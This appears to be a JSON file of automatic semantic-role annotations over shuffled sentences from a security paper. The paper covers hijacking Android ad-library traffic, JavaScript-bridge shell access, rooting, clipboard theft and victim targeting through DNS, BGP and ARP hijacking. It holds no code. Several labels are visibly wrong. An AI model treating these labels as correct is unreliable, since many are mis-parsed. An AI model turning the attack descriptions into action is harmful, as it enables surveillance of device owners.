"If the attackers can hijack the communication channels and inject malicious DEX files/ then"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "control", "index": 17}, "ARG1": {"text": "the behaviors of the victim apps"}}}, " For example,\nthe attackers can manipulate Android home                                     \nscreen icons using two normal permissions:                                    \nlauncher READ SETTINGS and WRITE                                              \nSETTINGS permissions": {"can": {"V": {"text": "can", "index": 5}}, "manipulate": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "manipulate", "index": 6}, "ARG1": {"text": "Android home screen icons"}, "ARGM-MNR": {"text": "using two normal permissions"}}, "using": {"ARG0": {"text": "the attackers"}, "V": {"text": "using", "index": 11}, "ARG1": {"text": "two normal permissions"}}}, " Malicious                                    \napps can steal the passwords if they can read                                 \nthe contents on clipboard": {"can": {"ARG0": {"text": "Malicious apps"}, "V": {"text": "can", "index": 2}, "ARG1": {"text": "steal the passwords"}, "ARGM-ADV": {"text": "if they can read the contents on clipboard"}}, "steal": {"ARG0": {"text": "Malicious apps"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "steal", "index": 3}, "ARG1": {"text": "the passwords"}, "ARGM-ADV": {"text": "if they can read the contents on clipboard"}}, "can_2": {"V": {"text": "can", "index": 8}}, "read": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "read", "index": 9}, "ARG1": {"text": "the contents"}, "ARG2": {"text": "on clipboard"}}}, "\n\nUsing the large-scale traffic intercepted from the\nabove methods, attackers can iden- tify potential\nvictims based on information leakage such as GPS                           \n\n<caption>\n     Figure 4: Number     \n     of ad libraries\n     included in Google            \n     Play apps (with\n     more than 50,000     \n     downloads\n</caption>\n<figure>                          \n                                                                       App Num\n                            25017\n                  20429\n                                       9196\n                                                 4452\n                                                                               2543\n                                                           2343\n                                                                                         1609       1310\n                                                                     1291                                   607   498      980\n                                                                                                          \n           0\n                     0         1         2         3         4         5         6         7          8      9     10      >10\n                          \n</figure>                          \n                          \n                                   \n                          \n                          \n\n\n<footnote>\n\n \t https://isc.sans.edu/diary/Domaincontrol+(GoDaddy)+Nameservers+DNS+ Poisoning+/5146": {"Using": {"V": {"text": "Using", "index": 0}, "ARG1": {"text": "the large - scale traffic intercepted from the above methods"}}, "intercepted": {"ARG1": {"text": "the large - scale traffic"}, "V": {"text": "intercepted", "index": 6}, "ARGM-DIR": {"text": "from the above methods"}}, "can": {"V": {"text": "can", "index": 13}}, "iden-": {"ARGM-MNR": {"text": "Using the large - scale traffic intercepted from the above methods"}, "ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "iden-", "index": 14}, "ARG1": {"text": "tify potential victims based on information leakage such as GPS https://isc.sans.edu / diary / Domaincontrol+(GoDaddy)+Nameservers+DNS+ Poisoning+/5146"}}, "tify": {"ARGM-MNR": {"text": "Using the large - scale traffic intercepted from the above methods/ iden-/ based on information leakage such"}, "ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "tify", "index": 15}, "ARG1": {"text": "potential victims"}}, "based": {"V": {"text": "based", "index": 18}, "ARG2": {"text": "on information leakage such as GPS https://isc.sans.edu / diary / Domaincontrol+(GoDaddy)+Nameservers+DNS+"}}}, "                              \nBy leveraging all these vulnerabilities, an attacker                             \ncan conduct more targeted attacks, which we call                                 \n\u201cSidewinder Targeted Attacks.\u201d In this paper we                                  \nexplain the security risks from such attacks, in                                 \nwhich an attacker can intercept and use private                                  \ninformation uploaded from ad libraries to                                        \nprecisely locate targeted areas such as a CEO\u2019s                                  \noffice or specific conference rooms": {"leveraging": {"V": {"text": "leveraging", "index": 1}, "ARG1": {"text": "all these vulnerabilities"}}, "can": {"V": {"text": "can", "index": 8}}, "conduct": {"ARGM-MNR": {"text": "By leveraging all these vulnerabilities"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "conduct", "index": 9}, "ARG1": {"text": "more targeted attacks , which we call \u201c Sidewinder Targeted Attacks"}}, "targeted": {"ARGM-EXT": {"text": "more"}, "V": {"text": "targeted", "index": 11}, "ARG1": {"text": "attacks"}}, "call": {"ARG1": {"text": "more targeted attacks"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "we"}, "V": {"text": "call", "index": 16}, "ARG2": {"text": "\u201c Sidewinder Targeted Attacks"}}, "Targeted": {"V": {"text": "Targeted", "index": 19}, "ARG1": {"text": "Attacks"}}, "explain": {"ARGM-LOC": {"text": "In this paper"}, "ARG0": {"text": "we"}, "V": {"text": "explain", "index": 27}, "ARG1": {"text": "the security risks from such attacks , in which an attacker can intercept and use private information uploaded from ad libraries to precisely locate targeted areas such as a CEO \u2019s office or specific conference rooms"}}, "can_2": {"V": {"text": "can", "index": 39}}, "intercept": {"ARGM-LOC": {"text": "the security risks from such attacks"}, "R-ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "intercept", "index": 40}, "ARG1": {"text": "private information"}}, "use": {"ARGM-LOC": {"text": "the security risks from such attacks"}, "R-ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "an attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "use", "index": 42}, "ARG1": {"text": "private information uploaded from ad libraries"}, "ARG2": {"text": "to precisely locate targeted areas such as a CEO \u2019s office or specific conference rooms"}}, "uploaded": {"ARG1": {"text": "private information"}, "V": {"text": "uploaded", "index": 45}, "ARG2": {"text": "from ad libraries"}}, "locate": {"ARGM-EXT": {"text": "precisely"}, "V": {"text": "locate", "index": 51}, "ARG1": {"text": "targeted areas"}}, "targeted_2": {"V": {"text": "targeted", "index": 52}, "ARG1": {"text": "areas such as a CEO \u2019s office"}}}, " The\nattacker can hijack the network where the\ntargeted victim resides": {"can": {"V": {"text": "can", "index": 2}}, "hijack": {"ARG0": {"text": "The attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "hijack", "index": 3}, "ARG1": {"text": "the network where the targeted victim resides"}}, "targeted": {"V": {"text": "targeted", "index": 8}, "ARG1": {"text": "victim resides"}}}, " Listing 1 is a sample\nJavascript snippet to execute shell command": {"Listing": {"V": {"text": "Listing", "index": 0}, "ARG1": {"text": "1"}}, "is": {"ARG1": {"text": "Listing 1"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a sample Javascript snippet to execute shell command"}}, "execute": {"ARG0": {"text": "snippet"}, "V": {"text": "execute", "index": 8}, "ARG1": {"text": "shell command"}}}, " In this screenshot, the victim\u2019s\ninstalled app list, clipboard, a photo taken from\nthe back camera, an audio clip, and a video clip\nhave been uploaded, with the GPS location\nintercepted from the ad library": {"installed": {"ARG2": {"text": "the victim \u2019s"}, "V": {"text": "installed", "index": 7}, "ARG1": {"text": "app list"}}, "taken": {"ARG1": {"text": "a photo"}, "V": {"text": "taken", "index": 15}, "ARG2": {"text": "from the back camera , an audio clip"}}, "have": {"V": {"text": "have", "index": 29}}, "been": {"ARGM-LOC": {"text": "In this screenshot"}, "ARG1": {"text": "the victim \u2019s installed app list , clipboard , a photo taken from the back camera , an audio clip , and a video clip"}, "V": {"text": "been", "index": 30}, "ARG2": {"text": "uploaded"}, "ARGM-MNR": {"text": "with the GPS location intercepted from the ad library"}}, "uploaded": {"ARGM-LOC": {"text": "In this screenshot"}, "ARG1": {"text": "the victim \u2019s installed app list , clipboard , a photo taken from the back camera , an audio clip , and a video clip"}, "V": {"text": "uploaded", "index": 31}, "ARGM-MNR": {"text": "with the GPS location intercepted from the ad library"}}, "intercepted": {"ARG1": {"text": "the GPS location"}, "V": {"text": "intercepted", "index": 37}, "ARG2": {"text": "from the ad library"}}}, "\nThus, as long as attackers can get the JBOH shell,\nthey have the tools to obtain root on most\nAndroid phone models": {"can": {"V": {"text": "can", "index": 6}}, "get": {"ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "get", "index": 7}, "ARG1": {"text": "the JBOH shell"}}, "have": {"ARGM-DIS": {"text": "Thus"}, "ARGM-ADV": {"text": "as long as attackers can get the JBOH shell"}, "ARG0": {"text": "they"}, "V": {"text": "have", "index": 13}, "ARG1": {"text": "the tools to obtain root on most Android phone models"}}, "obtain": {"V": {"text": "obtain", "index": 17}, "ARG1": {"text": "root"}, "ARGM-LOC": {"text": "on most"}}}, "\n\nBGP hijacking takes over groups of IP addresses,\ncorrupting Internet routing tables by breaking\nBGP sessions or injecting fake BGP information": {"takes": {"ARG0": {"text": "BGP hijacking"}, "V": {"text": "takes", "index": 2}, "ARG1": {"text": "over groups/ of IP addresses"}, "ARGM-ADV": {"text": "corrupting Internet routing tables by breaking BGP sessions or injecting fake BGP information"}}, "corrupting": {"V": {"text": "corrupting", "index": 9}, "ARG1": {"text": "Internet routing tables"}}, "breaking": {"ARG0": {"text": "BGP"}, "V": {"text": "breaking", "index": 14}, "ARG1": {"text": "BGP sessions"}}, "injecting": {"V": {"text": "injecting", "index": 18}, "ARG1": {"text": "fake BGP information"}}}, "\nThey can also alter the clipboard content to\nachieve phishing goals": {"can": {"V": {"text": "can", "index": 1}}, "alter": {"ARG0": {"text": "They"}, "ARGM-MOD": {"text": "can"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "alter", "index": 3}, "ARG1": {"text": "the clipboard content to achieve phishing goals"}}, "achieve": {"ARG0": {"text": "the clipboard content"}, "V": {"text": "achieve", "index": 8}, "ARG1": {"text": "phishing goals"}}, "phishing": {"V": {"text": "phishing", "index": 9}, "ARG1": {"text": "goals"}}}, " Furthermore, the                                  \nattackers can exploit several Android                                            \nvulnerabilities to get valuable private information                              \nor to launch more advanced attacks": {"can": {"V": {"text": "can", "index": 4}}, "exploit": {"ARGM-DIS": {"text": "Furthermore"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "exploit", "index": 5}, "ARG1": {"text": "several Android vulnerabilities"}, "ARG2": {"text": "to get valuable private information or to launch more advanced attacks"}}, "get": {"ARG0": {"text": "the attackers"}, "V": {"text": "get", "index": 10}, "ARG1": {"text": "valuable private information"}}, "launch": {"ARG0": {"text": "the attackers"}, "V": {"text": "launch", "index": 16}, "ARG1": {"text": "more advanced attacks"}}}, " After that,        \nthey can inject exploits only into the targeted         \ntraffic to launch further attacks": {"can": {"V": {"text": "can", "index": 4}}, "inject": {"ARGM-TMP": {"text": "After that"}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "inject", "index": 5}, "ARG1": {"text": "exploits"}, "ARGM-PRP": {"text": "to launch further attacks"}}, "targeted": {"V": {"text": "targeted", "index": 10}, "ARG1": {"text": "traffic"}}, "launch": {"ARG0": {"text": "they"}, "V": {"text": "launch", "index": 13}, "ARG1": {"text": "further attacks"}}}, "\n</section>                                                                         <section>\n<heading>Root Exploits and Code Injection</heading>\nOne direct threat posed by JBOH is to use the\nJBOH shell (Listing 1) to download exe- cutables\nand use them to root the device": {"posed": {"ARG1": {"text": "One direct threat"}, "V": {"text": "posed", "index": 3}, "ARG0": {"text": "by JBOH"}}, "is": {"ARG1": {"text": "One direct threat posed by JBOH"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to use the JBOH shell ( Listing 1 ) to download exe- cutables and use them to root the device"}}, "use": {"ARG0": {"text": "One direct threat posed by JBOH"}, "V": {"text": "use", "index": 8}, "ARG1": {"text": "the JBOH shell ( Listing 1 )"}, "ARG2": {"text": "to download exe- cutables"}}, "Listing": {"V": {"text": "Listing", "index": 13}, "ARG1": {"text": "1 )"}}, "download": {"ARG0": {"text": "One direct threat"}, "V": {"text": "download", "index": 17}, "ARG1": {"text": "exe- cutables"}}, "use_2": {"V": {"text": "use", "index": 21}, "ARG1": {"text": "them"}, "ARG2": {"text": "to root the device"}}, "root": {"ARG0": {"text": "them"}, "V": {"text": "root", "index": 24}, "ARG1": {"text": "the device"}}}, " We successfully launched Man-in-the-\nMiddle (MITM) attacks and intercepted the data\nuploaded to the remote server": {"launched": {"ARG0": {"text": "We"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "launched", "index": 2}, "ARG1": {"text": "Man - in - the- Middle ( MITM ) attacks"}}, "intercepted": {"ARG0": {"text": "We"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "intercepted", "index": 14}, "ARG1": {"text": "the data uploaded to the remote server"}}, "uploaded": {"ARG1": {"text": "the data"}, "V": {"text": "uploaded", "index": 17}, "ARG2": {"text": "to the remote server"}}}, " For example, the user\nmay copy a link to visit and the background\nmalicious service can change that link to a\nphishing site": {"may": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the user"}, "V": {"text": "may", "index": 5}, "ARGM-PRD": {"text": "copy"}, "ARG1": {"text": "a link to visit and the background"}}, "copy": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the user"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "copy", "index": 6}, "ARG1": {"text": "a link to visit and the background malicious service can change that link to a phishing site"}}, "visit": {"V": {"text": "visit", "index": 10}}, "can": {"V": {"text": "can", "index": 16}}, "change": {"ARG0": {"text": "the background malicious service"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "change", "index": 17}, "ARG1": {"text": "that link"}, "ARG2": {"text": "to a phishing site"}}, "link": {"ARG1": {"text": "that"}, "V": {"text": "link", "index": 19}, "ARG2": {"text": "to a phishing site"}}, "phishing": {"V": {"text": "phishing", "index": 22}, "ARG1": {"text": "site"}}}, " We verified                             \nthat Android apps with these two permissions can                             \nauthenticate themselves with the user\u2019s Google                               \naccount, allowing access to Google Play and the                              \nability send app installation requests": {"verified": {"ARG0": {"text": "We"}, "V": {"text": "verified", "index": 1}, "ARG1": {"text": "that Android apps with these two permissions can authenticate themselves with the user \u2019s Google account , allowing access to Google Play and the ability send app installation requests"}}, "apps": {"ARGM-MNR": {"text": "Android/ with these two permissions"}, "V": {"text": "apps", "index": 4}, "C-ARGM-MNR": {"text": "Play and the ability send app installation"}}, "can": {"V": {"text": "can", "index": 9}}, "authenticate": {"ARG0": {"text": "Android apps with these two permissions"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "authenticate", "index": 10}, "ARG1": {"text": "themselves"}, "ARG2": {"text": "with the user \u2019s Google account"}, "ARGM-ADV": {"text": "allowing access to Google Play and the ability send app installation requests"}}, "allowing": {"V": {"text": "allowing", "index": 19}, "ARG1": {"text": "access to Google Play"}}, "send": {"V": {"text": "send", "index": 27}, "ARG1": {"text": "app installation"}}}, "                                                        \n                                                                         \nTo launch more sophisticated attacks like sending                        \nSMS or taking pictures, the attackers may use                            \nJava reflection to call other APIs from the\nJavascript bridge": {"launch": {"V": {"text": "launch", "index": 1}, "ARG1": {"text": "more sophisticated attacks like sending SMS or taking pictures"}, "ARG0": {"text": "the attackers"}}, "sending": {"V": {"text": "sending", "index": 6}, "ARG1": {"text": "SMS"}}, "taking": {"V": {"text": "taking", "index": 9}, "ARG1": {"text": "pictures"}}, "may": {"V": {"text": "may", "index": 14}}, "use": {"ARGM-PRP": {"text": "To launch more sophisticated attacks like sending SMS or taking pictures"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "use", "index": 15}, "ARG1": {"text": "Java reflection"}, "ARG2": {"text": "to call other APIs from the Javascript bridge"}}, "call": {"ARG0": {"text": "Java reflection"}, "V": {"text": "call", "index": 19}, "ARG1": {"text": "other APIs"}, "ARG2": {"text": "from the Javascript bridge"}}}, " By DNS\nhijacking, attackers can effectively access all the\ntraffic to ad servers": {"can": {"ARGM-ADV": {"text": "By DNS hijacking"}, "ARG0": {"text": "attackers"}, "V": {"text": "can", "index": 5}, "ARGM-MNR": {"text": "effectively"}, "ARG1": {"text": "access all the traffic to ad servers"}}, "access": {"ARGM-ADV": {"text": "By DNS hijacking"}, "ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "effectively"}, "V": {"text": "access", "index": 7}, "ARG1": {"text": "all the traffic"}, "ARGM-PRD": {"text": "to ad servers"}}}, " Attackers successfully\ncompromised many DNS servers, including the\nones from Google and Godaddy<fn>24</fn>": {"compromised": {"ARG0": {"text": "Attackers"}, "ARGM-MNR": {"text": "successfully"}, "V": {"text": "compromised", "index": 2}, "ARG1": {"text": "many DNS servers , including the ones from Google and Godaddy"}}, "including": {"ARG2": {"text": "many DNS servers"}, "V": {"text": "including", "index": 7}, "ARG1": {"text": "the ones from Google and Godaddy"}}}, " Through the                          \nJavascript bridge, attackers can install apps of                             \nchoice (e.g., an attacker\u2019s phishing app) to any                             \ndevices registered in user\u2019s account in the                                  \nbackground without user consent": {"can": {"ARGM-MNR": {"text": "Through the Javascript bridge"}, "ARG0": {"text": "attackers"}, "V": {"text": "can", "index": 6}, "ARG1": {"text": "install apps of"}, "ARGM-PRD": {"text": "without user consent"}}, "install": {"ARGM-MNR": {"text": "Through the Javascript bridge"}, "ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "install", "index": 7}, "ARG1": {"text": "apps"}, "ARG2": {"text": "of choice ( e.g."}}, "phishing": {"V": {"text": "phishing", "index": 17}, "ARG1": {"text": "app )"}}, "registered": {"ARG1": {"text": "any devices"}, "V": {"text": "registered", "index": 23}, "ARG2": {"text": "in user \u2019s account"}, "ARGM-LOC": {"text": "in the background"}, "ARGM-MNR": {"text": "without"}}}, "\n                                                                              \nAs a proof-of-concept attack scenario, a malicious                            \napp with these two permissions can query/insert/                              \nalter the system icon settings and modify                                     \nlegitimate icons of some security- sensitive apps,                            \nsuch as banking apps, to a phishing website": {"can": {"V": {"text": "can", "index": 17}}, "query": {"ARGM-PRD": {"text": "As a proof - of - concept attack scenario"}, "ARG0": {"text": "a malicious app with these two permissions"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "query", "index": 18}, "ARG1": {"text": "the system icon settings and modify legitimate icons of some security- sensitive apps , such as banking apps , to a phishing website"}}, "alter": {"ARGM-PRD": {"text": "As a proof - of - concept attack scenario"}, "ARG0": {"text": "a malicious app with these two permissions can query / insert/"}, "V": {"text": "alter", "index": 21}, "ARG1": {"text": "the system icon settings"}}, "modify": {"V": {"text": "modify", "index": 27}, "ARG1": {"text": "legitimate icons of some security- sensitive apps , such as banking apps ,"}, "ARG2": {"text": "to a phishing website"}}, "phishing": {"V": {"text": "phishing", "index": 43}, "ARG1": {"text": "website"}}}, " Here,                                  \nwe explain how attackers can invoke Android                                      \nservices for tasks including taking photos, calling                              \nphone numbers, sending SMS, reading from/                                        \nwriting to the clipboard, etc": {"explain": {"ARGM-LOC": {"text": "Here"}, "ARG0": {"text": "we"}, "V": {"text": "explain", "index": 3}, "ARG1": {"text": "how attackers can invoke Android services for tasks including taking photos , calling phone numbers , sending SMS , reading from/ writing to the clipboard , etc"}}, "can": {"V": {"text": "can", "index": 6}}, "invoke": {"ARGM-MNR": {"text": "how"}, "ARG0": {"text": "attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "invoke", "index": 7}, "ARG1": {"text": "Android services for tasks including taking photos"}, "ARGM-PRD": {"text": "calling phone numbers , sending SMS , reading from/ writing to the clipboard , etc"}}, "including": {"V": {"text": "including", "index": 12}, "ARG1": {"text": "taking photos"}}, "taking": {"V": {"text": "taking", "index": 13}, "ARG1": {"text": "photos"}}, "calling": {"V": {"text": "calling", "index": 16}, "ARG1": {"text": "phone numbers"}}, "sending": {"V": {"text": "sending", "index": 20}, "ARG1": {"text": "SMS , reading"}, "ARG2": {"text": "from// to the clipboard , etc"}}, "reading": {"V": {"text": "reading", "index": 23}, "ARG1": {"text": "from/ writing to the clipboard , etc"}}, "from/": {"V": {"text": "from/", "index": 24}, "ARG1": {"text": "writing"}}}, "                                      \n</section>\n\n<section>                                                                             \n<heading>Targeting Victims Based on Ad Traffic</heading>                                        \nIn this section, we explain the risks of victims\u2019                            \ndevices being tracked and targeted through                                   \nad traffic": {"explain": {"ARGM-LOC": {"text": "In this section"}, "ARG0": {"text": "we"}, "V": {"text": "explain", "index": 5}, "ARG1": {"text": "the risks of victims \u2019 devices being tracked and targeted through ad traffic"}}, "being": {"ARG1": {"text": "victims \u2019 devices"}, "V": {"text": "being", "index": 12}, "ARG2": {"text": "tracked"}}, "tracked": {"ARG1": {"text": "victims \u2019 devices"}, "V": {"text": "tracked", "index": 13}, "ARGM-MNR": {"text": "through ad traffic"}}, "targeted": {"ARG2": {"text": "victims"}, "V": {"text": "targeted", "index": 15}, "ARG1": {"text": "through ad traffic"}}}, "\n\nARP hijacking (or spoofing) in IDC<fn>26</fn> is done to\nhijack the traffic to the ad server in the IDC where\nthe ad server locates through fake ARP packets": {"spoofing": {"ARG0": {"text": "ARP/ )"}, "V": {"text": "spoofing", "index": 4}}, "is": {"V": {"text": "is", "index": 8}}, "done": {"ARG1": {"text": "ARP hijacking ( or spoofing ) in IDC"}, "V": {"text": "done", "index": 9}, "ARGM-PRP": {"text": "to hijack the traffic to the ad server in the IDC where the ad server locates through fake ARP packets"}}, "hijack": {"ARG0": {"text": "ARP"}, "V": {"text": "hijack", "index": 11}, "ARG1": {"text": "the traffic"}, "ARG2": {"text": "to the ad server"}, "ARGM-LOC": {"text": "in the IDC where the ad server locates through fake ARP packets"}}, "locates": {"ARGM-LOC": {"text": "the IDC"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the ad server"}, "V": {"text": "locates", "index": 25}, "ARGM-MNR": {"text": "through fake ARP packets"}}}, " In later sections, we\ndiscuss attacking (\u201cwarhead\u201d) and targeting\n(\u201choming\u201d) components in detail and show how a\ncombination of these components can launch\npowerful and precise attacks on target devices": {"discuss": {"ARGM-TMP": {"text": "In later sections"}, "ARG0": {"text": "we"}, "V": {"text": "discuss", "index": 5}, "ARG1": {"text": "attacking ( \u201c warhead \u201d ) and targeting ( \u201c homing \u201d ) components in detail and show how a combination of these components can launch powerful and precise attacks on target devices"}}, "attacking": {"ARG0": {"text": "we"}, "V": {"text": "attacking", "index": 6}, "ARG1": {"text": "( \u201c warhead \u201d )"}}, "targeting": {"ARGM-TMP": {"text": "In later sections"}, "ARG0": {"text": "we"}, "V": {"text": "targeting", "index": 13}, "ARG1": {"text": "( \u201c homing \u201d ) components"}, "ARGM-MNR": {"text": "in detail"}}, "homing": {"V": {"text": "homing", "index": 16}, "ARG1": {"text": "\u201d ) components"}}, "show": {"ARGM-TMP": {"text": "In later sections"}, "ARG0": {"text": "we"}, "V": {"text": "show", "index": 23}, "ARG1": {"text": "how a combination of these components can launch powerful and precise attacks on target devices"}}, "can": {"ARGM-MNR": {"text": "how"}, "ARG0": {"text": "a combination of"}, "V": {"text": "can", "index": 30}}, "launch": {"ARGM-MNR": {"text": "how"}, "ARG0": {"text": "a combination of these components"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "launch", "index": 31}, "ARG1": {"text": "powerful and precise attacks"}, "ARGM-LOC": {"text": "on target devices"}}}, " Given that this ad                            \nlibrary loads ads using HTTP, if the host app has                        \nthe corresponding permissions (e.g., CALL\nPHONE), attackers over the network can abuse                             \nthese interfaces to do malicious things (e.g.,                           \nutilizing the makeCall interface to dial phone                           \nnumbers without the user\u2019s consent)": {"Given": {"V": {"text": "Given", "index": 0}, "ARG1": {"text": "that this ad library loads ads using HTTP , if the host app has the corresponding permissions ( e.g. ,"}}, "loads": {"ARG0": {"text": "this ad library"}, "V": {"text": "loads", "index": 5}, "ARG1": {"text": "ads"}, "ARG2": {"text": "using HTTP"}}, "using": {"ARG0": {"text": "this ad library loads ads"}, "V": {"text": "using", "index": 7}, "ARG1": {"text": "HTTP"}}, "has": {"ARG0": {"text": "the host app"}, "V": {"text": "has", "index": 14}, "ARG1": {"text": "the corresponding permissions ( e.g."}}, "can": {"ARG0": {"text": "network"}, "V": {"text": "can", "index": 29}, "ARG1": {"text": "abuse"}}, "abuse": {"ARG0": {"text": "attackers over the network"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "abuse", "index": 30}, "ARG1": {"text": "these interfaces"}, "ARGM-PRP": {"text": "to do malicious things ( e.g."}}, "do": {"V": {"text": "do", "index": 34}, "ARG1": {"text": "malicious things ( e.g."}}, "utilizing": {"V": {"text": "utilizing", "index": 40}, "ARG1": {"text": "the makeCall interface to dial phone numbers without the user \u2019s consent )"}}, "dial": {"ARG0": {"text": "the makeCall interface"}, "V": {"text": "dial", "index": 45}, "ARG1": {"text": "phone numbers"}, "ARGM-MNR": {"text": "without the user \u2019s consent )"}}}, " The panel also\npins down the GPS location of the victim\u2019s\ndevice onto a Google Map widget": {"pins": {"ARG0": {"text": "The panel"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "pins", "index": 3}, "ARG1": {"text": "the GPS location of the victim \u2019s device onto a Google Map widget"}}}, " Though\nad libraries may not have the incentive to abuse                             \nusers\u2019 private and sensitive data, this is not the                           \ncase with the attackers eavesdropping or hijacking\nthe HTTP traffic": {"may": {"V": {"text": "may", "index": 3}}, "have": {"ARG0": {"text": "ad libraries"}, "ARGM-MOD": {"text": "may"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "have", "index": 5}, "ARG1": {"text": "the incentive to abuse users \u2019 private and sensitive data"}}, "abuse": {"ARG0": {"text": "ad libraries"}, "V": {"text": "abuse", "index": 9}, "ARG1": {"text": "users \u2019 private and sensitive data"}}, "is": {"ARGM-ADV": {"text": "Though ad libraries may not have the incentive to abuse users \u2019 private and sensitive data"}, "ARG1": {"text": "this"}, "V": {"text": "is", "index": 18}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "the case with the attackers eavesdropping or hijacking the HTTP traffic"}}, "hijacking": {"V": {"text": "hijacking", "index": 27}, "ARG1": {"text": "the HTTP traffic"}}}, "                                     \n                                                                             \nIn this context, DNS hijacking is done to subvert\nthe resolution of Domain Name System (DNS)                                   \nqueries through modifying the behavior of DNS                                \nservers so that they serve fake DNS information": {"is": {"V": {"text": "is", "index": 6}}, "done": {"ARGM-LOC": {"text": "In this context"}, "ARG1": {"text": "DNS hijacking"}, "V": {"text": "done", "index": 7}, "ARGM-PRP": {"text": "to subvert the resolution of Domain Name System ( DNS ) queries through modifying the behavior of DNS servers so that they serve fake DNS information"}}, "subvert": {"ARG0": {"text": "DNS hijacking"}, "V": {"text": "subvert", "index": 9}, "ARG1": {"text": "the resolution of Domain Name System ( DNS ) queries"}, "ARGM-DIR": {"text": "through modifying the behavior of DNS servers"}, "ARGM-PRP": {"text": "so that they serve fake DNS information"}}, "queries": {"ARG0": {"text": "DNS )"}, "V": {"text": "queries", "index": 19}, "ARG2": {"text": "through modifying"}, "ARG1": {"text": "the behavior of DNS servers"}, "ARGM-PRP": {"text": "so that they serve fake DNS information"}}, "modifying": {"V": {"text": "modifying", "index": 21}, "ARG1": {"text": "the behavior of DNS servers"}}, "serve": {"ARG0": {"text": "they"}, "V": {"text": "serve", "index": 30}, "ARG2": {"text": "fake DNS information"}}}, "\nTo minimize detection chances, the attacker can\nchoose to take action on important targets only,\nignoring all other devices": {"minimize": {"V": {"text": "minimize", "index": 1}, "ARG1": {"text": "detection chances"}, "ARG0": {"text": "the attacker"}}, "can": {"V": {"text": "can", "index": 7}}, "choose": {"R-ARG0": {"text": "To minimize detection chances"}, "ARG0": {"text": "the attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "choose", "index": 8}, "ARG1": {"text": "to take action on important targets only , ignoring all other devices"}}, "take": {"ARG0": {"text": "the attacker"}, "V": {"text": "take", "index": 10}, "ARG1": {"text": "action on important targets only"}, "ARGM-ADV": {"text": "ignoring all other devices"}}, "ignoring": {"ARG0": {"text": "the attacker"}, "V": {"text": "ignoring", "index": 17}, "ARG1": {"text": "all other devices"}}}, " They also need to be cautious about         \nwhich privileged interfaces are exposed to the       \nad providers, in case of malicious ads or            \nattackers hijacking the communication channels": {"need": {"ARG0": {"text": "They"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "need", "index": 2}, "ARG1": {"text": "to be cautious about which privileged interfaces are exposed to the ad providers , in case of malicious ads or attackers hijacking the communication channels"}}, "be": {"ARG1": {"text": "They"}, "V": {"text": "be", "index": 4}, "ARG2": {"text": "cautious about which privileged interfaces are exposed to the ad providers"}, "ARGM-ADV": {"text": "in case of malicious ads or attackers hijacking the communication channels"}}, "are": {"V": {"text": "are", "index": 10}}, "exposed": {"ARG1": {"text": "privileged interfaces"}, "V": {"text": "exposed", "index": 11}, "ARG2": {"text": "to the ad providers"}}, "hijacking": {"ARG0": {"text": "malicious ads or attackers"}, "V": {"text": "hijacking", "index": 24}, "ARG1": {"text": "the communication channels"}}}, " Unfortunately, several                             \nwell-known attacks can be used to achieve                                    \nlarge-scale monitoring, including DNS hijacking,                             \nBGP hijacking, and ARP hijacking in IDC": {"known": {"ARGM-MNR": {"text": "well"}, "V": {"text": "known", "index": 5}, "ARG1": {"text": "attacks"}}, "can": {"V": {"text": "can", "index": 7}}, "be": {"V": {"text": "be", "index": 8}}, "used": {"ARGM-ADV": {"text": "Unfortunately"}, "ARG1": {"text": "several well - known attacks"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 9}, "ARG2": {"text": "to achieve large - scale monitoring , including DNS hijacking , BGP hijacking , and ARP hijacking in IDC"}}, "achieve": {"V": {"text": "achieve", "index": 11}, "ARG1": {"text": "large - scale monitoring"}}, "including": {"ARG2": {"text": "large - scale monitoring"}, "V": {"text": "including", "index": 17}, "ARG1": {"text": "DNS hijacking , BGP hijacking , and ARP hijacking in IDC"}}}, "\nThis enables attackers to monitor all traffic to\nspecific IPs": {"enables": {"ARG0": {"text": "This"}, "V": {"text": "enables", "index": 1}, "ARG2": {"text": "attackers"}, "ARG1": {"text": "to monitor all traffic to specific 